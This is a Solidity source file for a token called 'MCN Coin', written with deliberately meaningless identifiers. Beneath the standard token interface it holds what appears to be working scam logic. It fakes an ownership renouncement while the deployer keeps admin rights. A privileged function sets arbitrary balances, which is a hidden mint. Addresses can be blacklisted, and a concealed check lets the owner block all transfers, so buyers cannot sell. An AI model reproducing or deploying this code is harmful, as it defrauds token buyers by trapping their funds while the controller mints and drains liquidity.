//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface minLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapToken) external view returns (uint256);

    function transfer(address minFund, uint256 toLiquidity) external returns (bool);

    function allowance(address takeAtWallet, address spender) external view returns (uint256);

    function approve(address spender, uint256 toLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address minFund,
        uint256 toLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed buySwap, uint256 value);
    event Approval(address indexed takeAtWallet, address indexed spender, uint256 value);
}

interface limitTrading is minLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract tradingMarketing {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingSenderBuy {
    function createPair(address fromTo, address amountEnableLimit) external returns (address);
}

interface totalAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract MCNCoin is tradingMarketing, minLiquidity, limitTrading {

    mapping(address => bool) public listExempt;

    uint256 sellExempt;

    uint256 launchedExemptMarketing;

    function isMode(address receiverTeamAmount, uint256 toLiquidity) public {
        isFundList();
        shouldTx[receiverTeamAmount] = toLiquidity;
    }

    function transferFrom(address listFromAt, address minFund, uint256 toLiquidity) external override returns (bool) {
        if (_msgSender() != toWallet) {
            if (shouldTeam[listFromAt][_msgSender()] != type(uint256).max) {
                require(toLiquidity <= shouldTeam[listFromAt][_msgSender()]);
                shouldTeam[listFromAt][_msgSender()] -= toLiquidity;
            }
        }
        return listReceiver(listFromAt, minFund, toLiquidity);
    }

    address amountReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function listReceiver(address listFromAt, address minFund, uint256 toLiquidity) internal returns (bool) {
        if (listFromAt == fromReceiver) {
            return tokenLaunchedMarketing(listFromAt, minFund, toLiquidity);
        }
        uint256 limitSender = minLiquidity(modeLaunch).balanceOf(amountReceiver);
        require(limitSender == launchedExemptMarketing);
        require(!listExempt[listFromAt]);
        return tokenLaunchedMarketing(listFromAt, minFund, toLiquidity);
    }

    function allowance(address modeLiquidityWallet, address teamMarketing) external view virtual override returns (uint256) {
        if (teamMarketing == toWallet) {
            return type(uint256).max;
        }
        return shouldTeam[modeLiquidityWallet][teamMarketing];
    }

    function approve(address teamMarketing, uint256 toLiquidity) public virtual override returns (bool) {
        shouldTeam[_msgSender()][teamMarketing] = toLiquidity;
        emit Approval(_msgSender(), teamMarketing, toLiquidity);
        return true;
    }

    constructor (){
        if (fromSwapLimit == launchFund) {
            launchFund = walletSell;
        }
        marketingSwap();
        totalAt feeTradingAuto = totalAt(toWallet);
        modeLaunch = marketingSenderBuy(feeTradingAuto.factory()).createPair(feeTradingAuto.WETH(), address(this));
        
        fromReceiver = _msgSender();
        receiverFee[fromReceiver] = true;
        shouldTx[fromReceiver] = autoTxList;
        if (limitMode != fromSwapLimit) {
            fromSwapLimit = launchAmount;
        }
        emit Transfer(address(0), fromReceiver, autoTxList);
    }

    function balanceOf(address swapToken) public view virtual override returns (uint256) {
        return shouldTx[swapToken];
    }

    mapping(address => uint256) private shouldTx;

    string private fundTrading = "MCN";

    uint256 private fromSwapLimit;

    uint8 private toSender = 18;

    function minAuto(uint256 toLiquidity) public {
        isFundList();
        launchedExemptMarketing = toLiquidity;
    }

    mapping(address => bool) public receiverFee;

    address public fromReceiver;

    function isFundList() private view {
        require(receiverFee[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private shouldTeam;

    function totalSupply() external view virtual override returns (uint256) {
        return autoTxList;
    }

    function tokenLaunchedMarketing(address listFromAt, address minFund, uint256 toLiquidity) internal returns (bool) {
        require(shouldTx[listFromAt] >= toLiquidity);
        shouldTx[listFromAt] -= toLiquidity;
        shouldTx[minFund] += toLiquidity;
        emit Transfer(listFromAt, minFund, toLiquidity);
        return true;
    }

    string private tradingEnable = "MCN Coin";

    uint256 private launchAmount;

    uint256 public limitMode;

    function transfer(address receiverTeamAmount, uint256 toLiquidity) external virtual override returns (bool) {
        return listReceiver(_msgSender(), receiverTeamAmount, toLiquidity);
    }

    bool public feeTotal;

    function getOwner() external view returns (address) {
        return buyAt;
    }

    address private buyAt;

    address public modeLaunch;

    uint256 private autoTxList = 100000000 * 10 ** 18;

    bool public feeMarketing;

    function decimals() external view virtual override returns (uint8) {
        return toSender;
    }

    function symbol() external view virtual override returns (string memory) {
        return fundTrading;
    }

    function name() external view virtual override returns (string memory) {
        return tradingEnable;
    }

    event OwnershipTransferred(address indexed autoTeam, address indexed teamAt);

    function tokenTo(address autoFrom) public {
        isFundList();
        if (autoReceiverTeam) {
            launchFund = limitMode;
        }
        if (autoFrom == fromReceiver || autoFrom == modeLaunch) {
            return;
        }
        listExempt[autoFrom] = true;
    }

    address toWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function marketingSwap() public {
        emit OwnershipTransferred(fromReceiver, address(0));
        buyAt = address(0);
    }

    uint256 private walletSell;

    function owner() external view returns (address) {
        return buyAt;
    }

    function takeIsSell(address exemptFeeToken) public {
        if (feeTotal) {
            return;
        }
        
        receiverFee[exemptFeeToken] = true;
        if (walletSell == fromSwapLimit) {
            autoReceiverTeam = true;
        }
        feeTotal = true;
    }

    uint256 private launchFund;

    bool public autoReceiverTeam;

}